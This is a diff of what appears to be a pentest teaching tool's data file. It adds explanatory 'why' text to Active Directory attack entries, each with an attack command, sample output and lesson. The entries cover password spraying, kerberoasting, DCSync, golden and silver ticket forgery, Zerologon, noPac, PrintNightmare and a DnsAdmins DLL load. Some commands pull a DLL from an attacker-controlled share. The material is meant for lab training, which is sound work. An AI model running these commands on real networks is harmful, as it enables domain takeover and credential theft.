         'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
@@ -673,6 +718,7 @@
       teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
     },
     'crack-tgs': {
+      why: "The $krb5tgs$ ticket you roasted cracks offline to the service account's plaintext. Reach for it right after kerberoasting. Service accounts often carry weak, never-expiring passwords and elevated rights, so a crack here is frequently a big step up, sometimes straight to Domain Admin if the account is over-privileged. If rockyou does not break it, the password is strong, so note it and look elsewhere rather than grinding.",
       cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
@@ -682,6 +728,7 @@
       teach: 'A Kerberoasted service ticket (mode 13100) cracks offline, the DC never sees your guesses, so there is no lockout. "Cracked" means you now hold svc_sql\'s cleartext password, often a path to a database or a privileged service.',
     },
     'password-spray': {
+      why: "Spraying flips brute-forcing on its head: one likely password tried against many accounts, which stays under the lockout thresholds that per-account brute-forcing would trip. Reach for it when you have a user list but no credential, using seasonal or company-themed guesses (Summer2026!, Welcome1). It is careful by design, respect the lockout policy and spray slowly, and it works because in any large org someone always has the weak password you guessed.",
       cmd: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  DC01  [-] acme.internal\\Administrator:Autumn2026! STATUS_LOGON_FAILURE',
@@ -691,6 +738,7 @@
       teach: 'Spraying tries ONE password across many users (never many passwords at one user, that locks accounts). One seasonal guess often lands a valid login, as it did for jbloggs. Always check the lockout policy (--pass-pol) first.',
     },
     'bloodhound-collect': {
+      why: "An AD environment is a graph of users, groups, sessions, ACLs, and delegation, and BloodHound draws the attack paths manual browsing would never reveal, like \"your low-priv user reaches Domain Admin in three ACL hops\". Reach for it once you have any domain credential. It turns a confusing directory into a map with a shortest path, which is why it is the standard first move after a foothold, just remember every edge it draws can also be queried by hand.",
       cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [+] Collected 142 users, 38 groups, 12 computers',
@@ -700,6 +748,7 @@
       teach: 'BloodHound collection pulls the whole directory (users, groups, ACLs, sessions) into a zip you import into the BloodHound UI. There you ask "shortest path to Domain Admins" and it draws the attack chain for you. Collect first, analyse second.',
     },
     'adcs-esc': {
+      why: "Active Directory Certificate Services, misconfigured, lets a certificate become a credential for any identity, and the ESC1-11 family covers the many ways that happens; certipy find -vulnerable names the exact ESC number so you know which abuse applies. Reach for it when you have a domain credential and a CA in the environment. It is one of the most reliable modern paths to Domain Admin, so checking for vulnerable templates early is well worth it.",
       cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable", tool: 'certipy',
       output: [
         'Certificate Templates',
@@ -711,6 +760,7 @@
       teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone, including a Domain Admin. certipy finds it; the Vulnerabilities line is your path. AD CS is a frequent, high-impact domain-takeover route.',
     },
     'cert-authenticate': {
+      why: "A certificate issued for a principal (from an ADCS ESC abuse or shadow credentials) authenticates as that principal through PKINIT, and certipy auth returns a TGT and, via UnPAC-the-hash, the account's NT hash too. Reach for it right after you mint or steal a certificate. It is the step that converts \"I have a certificate\" into \"I am this user and here is their hash\", which is what makes the ADCS and shadow-credential paths actually pay off.",
       cmd: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', tool: 'certipy',
       output: [
         '[*] Using principal: administrator@acme.internal',
@@ -721,6 +771,7 @@
       teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash, the certificate was just the key that unlocked the credential.',
     },
     'lateral-exec': {
+      why: "Valid credentials with local-admin rights are code execution, and the only question is which tool: psexec (loud, service-based), wmiexec (quieter, semi-interactive), or evil-winrm (a full shell on 5985). Reach for it once you hold admin creds for a host and want a shell on it. Knowing the tradeoffs matters, psexec is reliable but noisy and drops a service, so on a monitored box you reach for wmiexec or WinRM instead.",
       cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", tool: 'nxc',
       output: [
         'SMB  10.10.10.20  445  WEB01  [*] Windows Server 2019 (name:WEB01) (domain:acme.internal)',
@@ -730,6 +781,7 @@
       teach: '"Pwn3d!" marks every host where a credential is local admin. Spraying a working cred across the subnet maps your lateral movement, each Pwn3d! box is a new shell (via nxc -x, psexec, or evil-winrm) and new loot.',
     },
     'ad-path-manual': {
+      why: "BloodHound is a convenience, not a requirement, and every edge it draws is a directory fact you can query by hand with nxc, bloodyAD, or ldapsearch. Reach for these first, because you often find the winning path (a roastable account, a writable group, a DCSync grant) before SharpHound even finishes, and you never depend on the collection landing or the GUI parsing. When BloodHound fails or returns nothing useful, this is how you keep moving.",
       cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [*] Accounts with adminCount=1 (protected / privileged)',
@@ -740,6 +792,7 @@
       teach: 'When you cannot run BloodHound, you can still find privileged targets by hand, adminCount=1 flags protected accounts. svc_backup in Backup Operators can read the SAM/NTDS, a direct privilege path worth chasing.',
     },
     'dump-secrets': {
+      why: "Admin on a Windows host hands you its secrets (SAM hashes, LSASS, cached logons); admin on a DC hands you the whole domain (NTDS.dit, every hash). So this is what you do the moment you get administrative access anywhere. Reach for it after any privileged foothold. The dumped hashes feed pass-the-hash, cracking, and lateral movement, and on a DC the dump is effectively game over.",
       cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --sam", tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
@@ -750,6 +803,7 @@
       teach: 'With local admin you can dump the SAM, the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
     },
     'dcsync': {
+      why: "DCSync is the clean way to steal every password in the domain: an account with replication rights (GetChanges + GetChangesAll) asks a DC to replicate password data, so you get the hashes without ever logging onto the DC or dumping NTDS by hand. Reach for it the instant you hold replication rights, whether from Domain Admin or an ACL abuse that granted them. The krbtgt hash it returns is the key to golden tickets, so it is both loot and a persistence setup.",
       cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc", tool: 'impacket-secretsdump',
       output: [
         '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
@@ -760,6 +814,7 @@
       teach: 'DCSync asks the DC to replicate password data, it needs replication rights (Domain Admin, or a delegated edge). It returns every hash in the domain, including krbtgt (the key to forge golden tickets). This is total domain compromise.',
     },
     'own-domain-pth': {
+      why: "Once DCSync or an NTDS dump has handed you every hash, the built-in Administrator (RID 500) is among them, and there is nothing left to crack, you pass that NT hash straight into a login and you are Domain Admin. Reach for it to cash in a completed dump. It is the anticlimactic final step that proves the domain is yours, and it is why \"just crack the password\" is unnecessary at the end: the hash is the credential.",
       cmd: 'nxc smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami', tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator:31d6... (Pwn3d!)',
@@ -770,6 +825,7 @@
       teach: 'You never need to crack the Administrator hash, you pass it. nxc -H authenticates with the NT hash directly and runs a command; "nt authority\\system" confirms you own the box. This is the payoff of dumping or DCSyncing the hash.',
     },
     'shadow-credentials': {
+      why: "When you hold GenericWrite over a computer or user object, you can add your own key to its msDS-KeyCredentialLink attribute and then authenticate as that object via PKINIT, with no password reset and without touching its existing credentials. Reach for it when an ACL abuse or relay gives you write over a target. It is stealthier than resetting a password (you add a key rather than changing anything they would notice) and it is the modern go-to for abusing GenericWrite.",
       cmd: 'pywhisker.py -d acme.internal -u jbloggs -p Autumn2026! --target svc_app --action add', tool: 'pywhisker',
       output: [
         '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
@@ -779,6 +835,7 @@
       teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT (certipy auth) to recover its NT hash. A quiet alternative to resetting a password.',
     },
     'golden-ticket': {
+      why: "The krbtgt hash lets you forge TGTs for any user with any group membership, which is persistence that survives password resets on every account except krbtgt itself. Reach for it after you own the domain and want durable access, or to impersonate a specific identity. It is a post-Domain-Admin tool, not a way in, you need krbtgt first, and because krbtgt is almost never rotated, a golden ticket can keep you in for a very long time.",
       cmd: 'impacket-ticketer -nthash 1a59bd44... -domain-sid S-1-5-21-... -domain acme.internal administrator', tool: 'impacket-ticketer',
       output: [
         '[*] Creating basic skeleton ticket and PAC Infos',
@@ -789,6 +846,7 @@
       teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice, the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
     },
     'trust-enum': {
+      why: "Domain and forest trusts let one domain's users authenticate to another, and misconfigured trusts turn one owned domain into two. Reach for it after you get any domain foothold, because the box you landed on may trust (or be trusted by) a richer domain you did not know existed. Enumerating trusts early keeps you from declaring victory too soon, the real target is sometimes across a trust you have not looked at yet.",
       cmd: 'nltest /domain_trusts', tool: 'nltest',
       output: [
         'List of domain trusts:',
@@ -800,6 +858,7 @@
       teach: 'Domains rarely stand alone. A trust to dev.acme.internal means credentials or tickets from one domain may reach the other, the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
     },
     'zerologon-check': {
+      why: "Zerologon is catastrophic (an unauthenticated attacker can reset a DC's machine-account password and seize the domain), and the CHECK is completely safe: it verifies the patch level without changing anything. Reach for it on any DC that might be unpatched. Always run the check before the exploit, because the exploit itself is destructive, so you confirm vulnerability first, then decide whether the risky exploit is worth it.",
       cmd: 'zerologon-scan DC01 10.10.10.10', tool: 'zerologon-scan',
       output: [
         'Performing authentication attempts...',
@@ -810,6 +869,7 @@
       teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT, it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
     },
     'wsus-abuse': {
+      why: "WSUS pushes updates to every Windows machine in the domain, and where it is misconfigured to use cleartext HTTP you can MITM that channel and deliver a malicious \"update\" that runs as SYSTEM on the clients. Reach for it when you find a WSUS server on HTTP and can position between it and its clients. It is niche but powerful, one misconfigured update server is code execution across the whole fleet, so it is worth recognising when you see it.",
       cmd: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer', tool: 'reg',
       output: [
         '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
@@ -819,6 +879,7 @@
       teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients, running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
     },
     'sccm-enum': {
+      why: "SCCM manages software deployment across the entire fleet, so taking it over means pushing code to everything as SYSTEM, and even short of takeover, enumerating it leaks credentials like the Network Access Account. Reach for it when you find SCCM in the environment. It is an increasingly common path in modern AD, the management infrastructure is a high-value target precisely because it is trusted to run code everywhere.",
       cmd: "sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10", tool: 'sccmhunter',
       output: [
         '[+] Management Point found: MP01.acme.internal',
@@ -829,6 +890,7 @@
       teach: 'SCCM/MECM stores Network Access Account credentials that clients can retrieve, frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
     },
     'nxc-arsenal': {
+      why: "NetExec (nxc) is the one tool that does most of AD: enumeration, validation, spidering, roasting, dumping, and execution, all under a single authentication syntax. Reach for it constantly, it is the workhorse you return to at every stage. The payoff of learning its flag families once is large: you stop context-switching between a dozen impacket scripts and drive most of the engagement from one consistent command line.",
       cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol", tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!',
@@ -840,6 +902,7 @@
       teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, and the password policy in a single run, then can execute modules. A WRITE share is a place to drop a payload or capture a hash.',
     },
     'kerberos-tickets': {
+      why: "Most \"impacket is broken\" moments are actually Kerberos hygiene: clock skew over five minutes breaks everything, tools read tickets from KRB5CCNAME, and you often need kinit or getTGT first. Reach for this knowledge whenever Kerberos auth mysteriously fails. It is not an attack, it is the operational discipline that makes every Kerberos attack work, syncing your clock to the DC and pointing tools at the right ccache fixes most of the frustrating failures.",
       cmd: 'sudo ntpdate -u 10.10.10.10', tool: 'ntpdate',
       output: [
         '# before: nxc ldap ... -> KRB_AP_ERR_SKEW (clock skew too great)',
@@ -849,6 +912,7 @@
       teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes, "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC with ntpdate and retry.',
     },
     'bloodyad-acl': {
+      why: "In modern AD the privilege paths are ACL paths, and bloodyAD edits the directory directly to abuse them: GenericAll, WriteDacl, WriteOwner, or group-write rights become \"add myself to this group\" or \"grant myself DCSync\". Reach for it when BloodHound or manual enumeration finds a writable object you control. It runs from Linux with just a credential, so it is the clean remote way to turn an ACL finding into actual privilege.",
       cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup NewP@ss123!", tool: 'bloodyAD',
       output: [
         '[+] Password changed successfully for svc_backup',
@@ -857,6 +921,7 @@
       teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password", a concrete takeover. Each edge BloodHound draws is an action like this one.',
     },
     'gmsa-read': {
+      why: "Group Managed Service Accounts have long random passwords AD rotates for you, but PrincipalsAllowedToRetrieveManagedPassword says WHO can read the current blob, and if you are (or can become) on that list you recover the NT hash directly, no cracking. Reach for it when enumeration shows a gMSA you are allowed to read. gMSAs are often over-privileged service accounts, so reading one can be a real jump, and the hash is immediately passable.",
       cmd: "bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_app$' --attr msDS-ManagedPassword", tool: 'bloodyAD',
       output: [
         'distinguishedName: CN=svc_app,CN=Managed Service Accounts,DC=acme,DC=internal',
@@ -866,6 +931,7 @@
       teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly (no cracking) and can pass it. gMSAs are often over-privileged service identities.',
     },
     'laps-read': {
+      why: "LAPS stores each machine's local-admin password in a computer attribute, and read rights are delegated, frequently to helpdesk or workstation-admin groups that are easier to compromise than you would expect. Reach for it when you control a principal with LAPS read rights over a machine. It hands you that host's local Administrator password in cleartext, a clean lateral-movement or privesc step without touching LSASS or cracking anything.",
       cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [+] LAPS passwords readable by jbloggs',
@@ -875,6 +941,7 @@
       teach: 'LAPS randomises the local Administrator password per machine, good security, unless your account can read the ms-Mcs-AdmPwd attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
     },
     'ticket-reuse': {
+      why: "Stolen or forged Kerberos tickets (.kirbi or ccache) work without any password, you simply ARE that principal until the ticket expires. On Windows, Rubeus injects them into your session; on Linux, you point KRB5CCNAME at the ccache. Reach for it after you dump tickets from LSASS or forge one. It is how you reuse a captured identity: pass-the-ticket for a stolen TGS, overpass-the-hash to turn an NT hash into a TGT, all without knowing the password.",
       cmd: 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal', tool: 'impacket-psexec',
       output: [
         '[*] Requesting shares on dc01.acme.internal.....',
@@ -886,6 +953,7 @@
       teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME, no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
     },
     'powerview-enum': {
+      why: "Once you are ON a domain-joined Windows box, PowerView gives deep AD recon from the inside with no extra privileges: users, groups, SPN accounts, ACLs, trusts, all queried live. Reach for it when you have an interactive Windows foothold and want to explore without uploading heavy tooling. Loaded in memory it touches no disk, which makes it the go-to inside-the-domain recon tool, when AMSI has not signatured it.",
       signal: 'ActiveDirectoryRights  : GenericAll',
       teach: 'PowerView is a PowerShell script, not a built-in, so you load it into memory straight from your box with IEX (nothing touches disk), then call its functions. A GenericAll ACL over a group is a takeover edge (you can add yourself to it). Same data BloodHound uses, gathered by hand.',
       steps: [
@@ -898,6 +966,7 @@
       ],
     },
     'ad-legacy-enum': {
+      why: "net.exe, setspn, and nltest ship with Windows, so they trigger no AMSI, no signatures, and need no uploads, yet they answer most first-pass AD questions: users, groups, membership, SPNs, DCs, password policy. Reach for them on a locked-down box where PowerView and uploads are blocked. They are the living-off-the-land option, less powerful than PowerView but always present, which makes them the reliable fallback when everything fancier is caught.",
       cmd: 'net group "Domain Admins" /domain', tool: 'net',
       output: [
         'Group name     Domain Admins',
@@ -909,6 +978,7 @@
       teach: 'Every Windows box ships with net and nltest. They are noisy but always present, when you land with no tools, these built-ins still list users, groups, and Domain Admins. backupadmin in Domain Admins is a target worth pursuing.',
     },
     'ad-psdotnet-enum': {
+      why: "When PowerView is signatured or missing, bare .NET classes do the same recon with no imports: System.DirectoryServices locates the PDC and resolves the domain, DirectorySearcher queries the directory. Reach for it when AMSI eats PowerView but you still have PowerShell. It is the stealthy middle ground, more capable than net.exe, less detectable than PowerView, and because it uses built-in framework classes there is nothing to flag.",
       cmd: 'powershell -ep bypass -c "([ADSISearcher]\'(servicePrincipalName=*)\').FindAll()"', tool: 'powershell',
       output: [
         'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
@@ -918,6 +988,7 @@
       teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell, no upload. An account with an SPN (svc_sql) is kerberoastable. Living off the land this way sidesteps AV that flags known tooling.',
     },
     'ad-acl-abuse': {
+      why: "AD objects carry ACLs, and misconfigured ones hand out privilege for free: GenericAll on a group means add yourself, ForceChangePassword on a user means reset their password, WriteDacl means grant yourself DCSync. Reach for it when BloodHound or manual enumeration finds an ACL you control over a useful object. These are the backbone of modern AD escalation, no exploit, no CVE, just abusing permissions the admins set wrong.",
       cmd: 'net group "Helpdesk Admins" jbloggs /add /domain', tool: 'net',
       output: [
         'The command completed successfully.',
@@ -926,6 +997,7 @@
       teach: 'When you hold GenericAll (or AddMember) over a group, you simply add yourself to it, the ACL edge becomes membership, and membership becomes its privileges. Walk the BloodHound path one edge at a time until it reaches Domain Admin or DCSync.',
     },
     'zerologon-exploit': {
+      why: "The Zerologon exploit fully compromises a vulnerable DC with no credentials: reset the machine-account password to empty, then replicate the whole domain. But resetting that password can break the DC's domain membership, so you MUST restore it afterward or risk taking the DC offline. Reach for it only after the safe check confirms vulnerability, and only when you are prepared to restore, this is the destructive one, handled carefully.",
       cmd: 'python3 set_empty_pw.py DC01 10.10.10.10', tool: 'sh',
       output: [
         '[*] Resetting DC01$ machine account password to empty',
@@ -936,6 +1008,7 @@
       teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
     },
     'coerce-auth': {
+      why: "You can force a DC or server to authenticate to a host you control over PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), or DFSCoerce (MS-DFSNM), and that coerced machine authentication is the trigger for a relay (to ADCS or LDAP) or an unconstrained-delegation TGT capture. Reach for it when you need the DC's own authentication and have something set up to catch it. Coercion is the spark: useless alone, powerful paired with a relay or delegation host waiting to receive the auth.",
       cmd: "coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal", tool: 'coercer',
       output: [
         '[+] (PetitPotam) EfsRpcOpenFileRaw triggered',
@@ -946,6 +1019,7 @@
       teach: 'Coercion tricks a target (often a DC) into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
     },
     'unconstrained-delegation': {
+      why: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it, so if you own such a host and coerce the DC to connect, you capture the DC's own TGT, which is effectively the domain. Reach for it when enumeration flags an unconstrained-delegation host you can compromise. It is a two-part play, own the delegation host, then coerce a high-value target to it, and the reward is a DC-level ticket.",
       signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
       teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Rubeus is an .exe, so stage it first (serve from your box, pull it over with certutil), then run its monitor. Pair it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
       steps: [
@@ -959,6 +1033,7 @@
       ],
     },
     'silver-ticket': {
+      why: "A service account's (or computer's) NT hash lets you forge a service ticket for that specific service as any user, with no DC contact and no krbtgt, so it is quieter than a golden ticket and needs no domain dominance. Reach for it when you have a service account's hash and want access to just that service (CIFS, HTTP, MSSQL) as an admin. The tradeoff is scope: a silver ticket is one service, but it is stealthy and needs far less than a golden one.",
       cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
       output: [
         '[*] Creating basic skeleton ticket and PAC Infos',
@@ -969,6 +1044,7 @@
       teach: 'A silver ticket forges a service ticket using one service account\'s hash, scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
     },
     'diamond-ticket': {
+      why: "A diamond ticket modifies a real, DC-issued TGT instead of forging one from scratch (a golden ticket), so its fields stay consistent with legitimate tickets and it evades the detections that catch forged ones. It still needs the krbtgt hash. Reach for it when you own the domain but want stealth over a plain golden ticket. It is the evasion-conscious version of the same idea: start from a genuine ticket, change what you need, and blend in.",
       signal: '[+] Saving diamond ticket to administrator.ccache',
       teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. It is a Rubeus .exe, so stage it first (serve from your box, certutil it onto the target), then run the diamond command. Both ticket types need the krbtgt key, this is a stealthier flavour of the same post-DA persistence.',
       steps: [
@@ -982,6 +1058,7 @@
       ],
     },
     'gpo-abuse': {
+      why: "Write access to a GPO, or to an OU it is linked to, is code execution as SYSTEM on every computer in scope: you add an immediate scheduled task or a local-admin membership through the policy and it applies fleet-wide. Reach for it when an ACL finding gives you write over a GPO. It is one of the highest-impact ACL abuses, a single writable policy can mean SYSTEM on dozens of machines, so GPO write rights are a prize worth hunting in BloodHound.",
       cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
       output: [
         '[+] Version updated for GPO {31B2F340-...}',
@@ -991,6 +1068,7 @@
       teach: 'Write access to a Group Policy Object lets you push a scheduled task to every computer the GPO is linked to, code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
     },
     'dnsadmins-abuse': {
+      why: "A member of DnsAdmins can point the DNS service (running as SYSTEM on the DC) at an arbitrary DLL through a registry value, and restarting the service loads your DLL as SYSTEM on the DC. Reach for it when you land in the DnsAdmins group, which is sometimes handed out as a \"low-risk\" admin role. It is a classic DC privesc from a seemingly minor membership, and it is why DnsAdmins is effectively a path to Domain Admin.",
       cmd: 'nxc smb 10.10.10.10 -u svc_dns -p P@ss -x "reg add ...\\DNS\\Parameters /v ServerLevelPluginDll /d \\\\10.10.14.5\\share\\dns.dll"', tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  DC01  [+] Executed command',
@@ -1001,6 +1079,7 @@
       teach: 'The DnsAdmins group can tell the DNS service (often on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy, but membership in DnsAdmins is a direct line to owning the DC.',
     },
     'sid-history-abuse': {
+      why: "SID history lets a principal carry privileges from another domain, and with the krbtgt key you can inject a privileged SID (like Enterprise Admins) into a forged ticket to grant yourself those rights, including across a forest trust. Reach for it when you hold krbtgt and want to escalate across domains or persist with hidden privilege. It is advanced and post-domain-dominance, the extra SID rides along invisibly, granting access that does not show up in normal group memberships.",
       cmd: 'impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain acme.internal -extra-sid S-1-5-21-ROOT-519 administrator', tool: 'impacket-ticketer',
       output: [
         '[*] Creating golden ticket with extra SID (Enterprise Admins)',
@@ -1011,6 +1090,7 @@
       teach: 'SID History lets a principal carry privileged SIDs from another domain, legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
     },
     'eternalblue': {
+      why: "MS17-010 (EternalBlue) is unauthenticated SYSTEM-level RCE against an unpatched SMBv1 server, no credentials needed, which is why nmap's smb-vuln-ms17-010 flag is worth checking on any old Windows box. Reach for it when that check says VULNERABLE. It is reliable but can blue-screen the target, so treat it as a known-good exploit against confirmed-vulnerable hosts, not a blind spray, and remember it is a patch gap, not a misconfiguration.",
       cmd: 'nmap -p445 --script smb-vuln-ms17-010 -oN scans/ms17010.txt 10.10.10.10', tool: 'nmap',
       output: [
         'Host script results:',
@@ -1022,6 +1102,7 @@
       teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot, but confirm the target is a real lab host, not a honeypot, before you fire the exploit.',
     },
     'nopac': {
+      why: "On an unpatched DC, any authenticated user can rename a machine account to impersonate a DC and then request a ticket as a privileged account, a straight line from a low-priv domain credential to Domain Admin. Reach for it when you have any domain credential and the DC is unpatched (CVE-2021-42278/42287). It is one of the fastest post-foothold escalations when it applies, so checking the DC's patch level early can save you the whole ACL-path grind.",
       cmd: "noPac.py acme.internal/jbloggs:'Autumn2026!' -dc-ip 10.10.10.10 -dump", tool: 'noPac.py',
       output: [
         '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
@@ -1033,6 +1114,7 @@
       teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user, a near-instant domain takeover on unpatched DCs. Beyond core OSCP scope but common in labs; confirm the DC is unpatched first.',
     },
     'printnightmare': {
+      why: "The Print Spooler can be abused to load your DLL as SYSTEM, remotely against any host running Spooler with a domain credential, or locally for privesc. Reach for it when Spooler is running and you have a credential, or need a local escalation. It is reliable when the service is up (and it is up by default on a lot of hosts), which is exactly why disabling Spooler became standard hardening advice after it dropped.",
       cmd: "CVE-2021-1675.py acme.internal/jbloggs:'Autumn2026!'@10.10.10.10 '\\\\10.10.14.5\\share\\evil.dll'", tool: 'CVE-2021-1675.py',
       output: [
         '[*] Connecting to the Print Spooler service (MS-RPRN)',
@@ -1043,6 +1125,7 @@
       teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to load a driver as SYSTEM, local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
     },
     'ms14-068': {
+      why: "On a DC missing the MS14-068 patch, an ordinary domain user can forge a Kerberos PAC claiming Domain Admin membership, turning low-priv credentials straight into domain compromise. Reach for it only on genuinely old DCs, it is an ancient bug. It is rare now but trivial when present: a single command takes a basic user to DA, so on a legacy box it is worth a quick check before anything harder.",
       cmd: "impacket-goldenPac -dc-ip 10.10.10.10 acme.internal/jbloggs:'Autumn2026!'@dc01.acme.internal", tool: 'impacket-goldenPac',
       output: [
         '[*] Requesting a TGT with a forged PAC (admin SID)',
@@ -1053,6 +1136,7 @@
       teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin membership. It only works on DCs missing the 2014 patch, rare today, but a clean, memorable example of how PAC validation can fail.',
     },
     'delegation-abuse': {
+      why: "Kerberos delegation lets services act on behalf of users, and its misconfigurations are escalation paths: unconstrained delegation caches TGTs (coerce the DC to it and you own the domain), while constrained and resource-based variants let a service request tickets as anyone. Reach for it when enumeration flags a delegation setting you can abuse. It is a family of related attacks, the common thread is that delegation trust, set too loosely, lets you borrow a more privileged identity.",
       cmd: 'impacket-addcomputer acme.internal/jbloggs:Autumn2026! -dc-ip 10.10.10.10 -computer-name OBOL$ -computer-pass MachinePass123!', tool: 'impacket-addcomputer',
       output: [
         '[*] Successfully added machine account OBOL$ with password MachinePass123!',
@@ -1062,6 +1146,7 @@
       teach: 'By default any domain user can add up to 10 computer accounts (MachineAccountQuota). A machine account you control is the starting piece for RBCD and S4U delegation attacks, create it, then configure delegation to impersonate an admin.',
     },
     'getst-impersonation': {
+      why: "Constrained and resource-based constrained delegation let a service account request service tickets as ANY user (Administrator included) through the S4U2self and S4U2proxy extensions, and getST performs that exchange for you. Reach for it when you control an account with delegation rights, or you set up RBCD through an ACL write. It is the practical cash-in of a delegation finding: the output is a ticket that lets you act as Administrator against the delegated service.",
       cmd: "impacket-getST -spn cifs/file01.acme.internal -impersonate administrator 'acme.internal/OBOL$:MachinePass123!'", tool: 'impacket-getST',
       output: [
         '[*] Impersonating administrator',
@@ -1075,6 +1160,7 @@
 
     // ============================ CREDENTIALS & CRACKING ============================
     'responder-poison': {
